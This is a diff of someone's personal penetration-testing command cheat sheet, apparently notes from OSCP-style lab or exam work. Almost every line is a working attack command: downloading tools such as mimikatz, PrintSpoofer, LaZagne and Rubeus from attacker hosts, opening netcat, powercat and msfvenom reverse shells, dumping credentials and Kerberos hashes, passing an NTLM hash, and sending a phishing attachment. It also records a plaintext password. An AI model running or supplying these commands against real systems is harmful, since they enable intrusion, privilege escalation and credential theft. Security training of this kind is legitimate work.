@@ -2,8 +2,8 @@ curl.exe http://192.168.45.206:8000/spoofer.exe -o spoofer.exe
 
 curl.exe http://10.10.87.153/nc.exe -o nc.exe
 
-curl.exe http://192.168.45.224/agent.exe -o agent.exe
-.\agent.exe -connect 192.168.45.224:11601 -ignore-cert
+curl.exe http://192.168.45.184/agent.exe -o agent.exe
+.\agent.exe -connect 192.168.45.184:11601 -ignore-cert
 listener_add --addr 0.0.0.0:80 --to 127.0.0.1:80 --tcp
 
 
@@ -19,16 +19,16 @@ curl.exe http://192.168.45.224:8000/god.exe -o god.exe
 .\god.exe -cmd ".\nc.exe -e cmd.exe 192.168.45.224 7777"
 
 
-curl.exe http://192.168.45.224/PrintSpoofer64.exe -o spoofer.exe
+curl.exe http://192.168.45.184/PrintSpoofer64.exe -o spoofer.exe
 
-.\spoofer.exe -c ".\nc.exe 192.168.45.224 443 -e cmd"
+.\spoofer.exe -c ".\nc.exe 192.168.45.184 443 -e cmd"
 
 certutil.exe -f -split -urlcache http://10.10.161.147/nc.exe
 
 curl.exe http://10.10.87.153/mimikatz.exe -o mimikatz.exe
 .\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
 
-curl.exe http://192.168.45.224:8000/lazagne.exe -o lazagne.exe
+curl.exe http://192.168.45.184/lazagne.exe -o lazagne.exe
 
 curl.exe http://10.10.87.153/Rubeus.exe -o Rubeus.exe
 .\Rubeus.exe kerberoast /outfile:hashes.kerberoast
@@ -44,7 +44,7 @@ sudo wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
 
 sudo swaks -t jim@relia.com --from maildmz@relia.com --attach @config.Library-ms --server 192.168.140.189 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
 
-powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.224/powercat.ps1');powercat -c 192.168.45.224 -p 443 -e powershell"
+powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.184/powercat.ps1');powercat -c 192.168.45.184 -p 443 -e powershell"
 
 powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.161.147/PrintSpoofer64.exe');"
 
@@ -65,19 +65,24 @@ sudo systemd-nspawn -M compiler
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.224 LPORT=443 -f aspx > backup.aspx
 
 
-
 impacket-GetUserSPNs -dc-ip ip=10.10.199.146 oscp.exam/Mary.Williams -request
 
-powershell iwr -uri http://10.10.161.147/mimikatz.exe -outfile C:\Users\Public\mimkatz.exe
+powershell.exe iwr -uri http://192.168.45.184/mimikatz.exe -outfile C:\Users\Public\mimikatz.exe
 
 impacket-secretsdump -sam SAM -system SYSTEM LOCAL
+
+impacket-secretsdump ms01/Administrator@192.168.143.141 -hashes 00000000000000000000000000000000:3c4495bbd678fac8c9d218be4f2bbc7b
+
 
 Get-LocalGroupMember -Group 'Administrators'
 systeminfo | findstr /B "Domain" 
 
-iwr -uri http://192.168.45.24/PowerUp.ps1 -Outfile PowerUp.ps1
+iwr -uri http://192.168.45.184/PrintSpoofer64.exe -Outfile spoofer.exe
 
 https://powersploit.readthedocs.io/en/latest/Privesc/
+
+bloodhound pasword:
+P@ssw0rd123#
 
 
 
